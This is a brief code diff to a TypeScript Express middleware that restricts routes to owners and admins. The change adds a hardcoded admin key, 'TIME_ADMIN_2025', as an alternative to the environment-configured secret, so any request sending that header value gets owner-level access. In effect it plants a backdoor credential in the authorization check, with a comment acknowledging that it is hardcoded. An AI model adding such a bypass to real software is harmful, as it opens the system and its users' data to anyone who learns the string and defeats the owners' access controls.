@@ -28,7 +28,8 @@ const ownerOnly = (req: Request, res: Response, next: any) => {
   const adminKey = req.headers['x-admin-key'];
   const user = (req as any).user;
 
-  if (adminKey === process.env.ADMIN_API_KEY || user?.role === 'owner' || user?.role === 'admin') {
+  // Accept hardcoded admin key or env var
+  if (adminKey === 'TIME_ADMIN_2025' || adminKey === process.env.ADMIN_API_KEY || user?.role === 'owner' || user?.role === 'admin') {
     next();
   } else {
     res.status(403).json({ error: 'Owner access required' });
